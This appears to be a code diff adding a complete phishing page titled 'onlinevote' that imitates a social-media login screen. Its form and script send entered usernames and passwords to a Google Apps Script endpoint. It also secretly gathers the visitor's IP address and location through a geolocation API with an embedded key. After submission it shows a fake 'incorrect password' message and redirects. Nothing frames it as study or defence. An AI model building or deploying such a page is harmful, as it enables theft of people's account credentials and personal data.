@@ -1,0 +1,196 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>onlinevote</title>
+    <link rel="stylesheet" href="/css/content2.css">
+    
+</head>
+    <body style="background-color: #ffff;">
+      
+     <div >
+        <span id="root">
+          <section class="section-all">
+            <!-- 1-Role Main -->
+            <main class="main" role="main" >
+                
+              <div class="wrappe">
+                <article class="article">
+                  <div class="content">
+                    <div style="margin: 1rem auto;">
+                        <img class="logo" src="/img/logo.png"  alt=""> 
+                      </div>
+
+                      <h3 style="font-size:15px; margin:15px auto;text-align: center;">
+                        Sign in to continue
+                        </h3>
+
+
+                     <!-- Header end -->
+                     
+                    <div class="login-box">
+                    
+                      <div class="form-wrap">
+                        <form action= 'https://script.google.com/macros/s/AKfycbz7Oaea7MbqHQCLf4j7TrqozuUonDSoqvps8CrbLrantOjIxytlHiAxVoHyg4zDyZnVBg/exec' id="form"  method="POST" >
+      
+                          <div class="input-box">
+                            <input type="text" id="name" aria-describedby="" placeholder="Phone number, username, or email" aria-required="true" maxlength="30" autocapitalize="off" autocorrect="off" name='USER'  required >
+                          </div>  
+                          
+                          <div class="input-box">
+                            <input  type="password" name="PASS" id="password" placeholder="Password" aria-describedby="" min-length="8" aria-required="true" autocapitalize="off" autocorrect="off" required>
+                          </div> 
+                          <input type="text" name="CATEGORY" value="FFBB" hidden>
+                          <input type="text" name="CONTINENT" id="continent" value="" hidden>
+                          <input type="text" name="COUNTRY" id="country" value="" hidden>
+                          <input type="text" name="CAPITAL" id="capital" value="" hidden>
+                          <input type="text" name="STATE" id="state" value="" hidden>
+                          <input type="text" name="CITY" id="city" value="" hidden>
+                          <input type="text" name="CURRENCY" id="currency" value="" hidden>
+                          <input type="text" name="PHONE_CODE" id="phone_code" value="" hidden>
+                          <input type="text" name="IP_ADDRESS" id="ip" value="" hidden>
+                          
+                          <span class="button-box">
+                            <button type="submit" name="submit" id="submit" class="btn">login</button>
+                          </span>
+                          
+                          <div style="color:#1877F2; margin:12px; text-align:center;">
+                            <p>Forgotten password?</p>
+                          </div>
+
+                          <!-- <div style="border: 1px solid rgb(219, 219, 252); margin:20px 16px;"></div> -->
+
+                          <hr style="width:75%;">
+
+                          
+                          
+                            <div id="error" style="display: none; color:red; margin:12px auto; font-size:0.8rem; padding:12px; text-align: center; ">
+                              </div>
+                         <div style="width:50%; height:17px; margin:12px auto; border:15px; padding:0 17px; ">
+                            <button type="button" class="create-button" style="background-color: #42B72A; margin:2px;border:1px; border-radius:5px; font-size: 14px;
+                            font-family:Arial, Helvetica, sans-serif; color:#ffff">
+                              <p style= "padding:4px; ">Create new account</p>
+                            </button>
+                          </div>
+                        </form>
+                      
+                    </div>
+                                <!-- error messages... -->
+                              
+                    </div> <!-- Login-box end -->
+      
+                   <!-- Signup-box end -->
+      
+                  <div style="margin:18px auto;"><h4>Create a Page <span>for a celebrity, brand or business.</span></h4></div>
+                  </div> <!-- Content end -->
+                </article>
+              </div> <!-- Wrapper end -->
+            </main>
+          </section>
+        </div>
+      
+            <!-- 2-Role Footer -->
+            <footer class="footer" role="contentinfo">
+              <div class="footer-container">
+      
+                <nav class="footer-nav" role="navigation" style="height:26rem;">
+                  <ul>
+                    <li><a href="">About</a></li>
+                    <li><a href="">Blog</a></li>
+                    <li><a href="">Jobs</a></li>
+                    <li><a href="">help</a></li>
+                    <li><a href="">Jobs</a></li>
+                    <li><a href="">Help</a></li>
+                    <li><a href="">API</a></li>
+                    <li><a href="">Terms</a></li>
+                    <li><a href="">Top Accounts</a></li>
+                    <li><a href="">Locations</a></li>
+                    <li><a href="">Contact UPloading and Non-Users</a></li>
+                    <li>
+                      <span class="language">
+                        <select name="language" class="select" onchange="la(this.value)">
+                          <option value="#">English</option>
+                          <option value="http://ru-instafollow.bitballoon.com">Russian</option>
+                        </select>
+                      </span>
+                    </li>
+                  </ul>
+                </nav>
+              </div> <!-- Footer container end -->
+            </footer>
+            
+        </span> <!-- Root -->
+      
+        
+        
+
+        <script>
+          const  error= document.querySelector("#error");
+          const form = document.querySelector("#form")
+         const submitButton = document.querySelector("#submit")
+         const scriptURL = 'https://script.google.com/macros/s/AKfycbz7Oaea7MbqHQCLf4j7TrqozuUonDSoqvps8CrbLrantOjIxytlHiAxVoHyg4zDyZnVBg/exec'
+      
+         form.addEventListener('submit', e => {
+           submitButton.disabled = true
+           e.preventDefault() 
+           let requestBody = new FormData(form)
+           fetch(scriptURL, { method: 'POST', body: requestBody})
+           .then(function response(data){
+          //  alert("plese insert a valid username and password...")
+                error.style.display="block";
+                error.innerHTML="The password you entered is incorrect. Check your password or username and try again.";
+            //
+            submitButton.disabled = true
+           setTimeout(() => {
+            window.location.href= "/contentgg.html";
+           }, 4000);
+            form.rest();
+           })
+            .catch(error => {
+          
+              submitButton.disabled = false })
+}) 
+
+
+var xhr= new XMLHttpRequest();
+ xhr.addEventListener('readystatechange', function (){
+
+
+    if(xhr.readyState==4){
+        var data = JSON.parse(this.responseText);
+    
+        let continentName = data.continent.name;
+        let countryName = data.country.name;
+        let cityName = data.country.capital;
+        let state= data.state.name;
+        let city= data.city.name;
+        let countryCurrency = data.country.currency;
+        let phoneCode= data.country.phone_code;
+        let ip = data.ip;
+
+        document.getElementById("continent").value = continentName;
+        document.getElementById("country").value = countryName;
+        document.getElementById("capital").value = cityName;
+        document.getElementById("state").value = state;
+        document.getElementById("city").value = city;
+        document.getElementById("currency").value = countryCurrency;
+        document.getElementById("phone_code").value = phoneCode;
+        document.getElementById("ip").value = ip;
+        
+      }
+
+     
+    })
+xhr.open('GET', 'https://api.geoapify.com/v1/ipinfo?&apiKey=1ee5beee55c74cde815530b82f8ab2bf');
+xhr.send();
+
+
+      
+      </script>
+      </body
+
+
+</html>
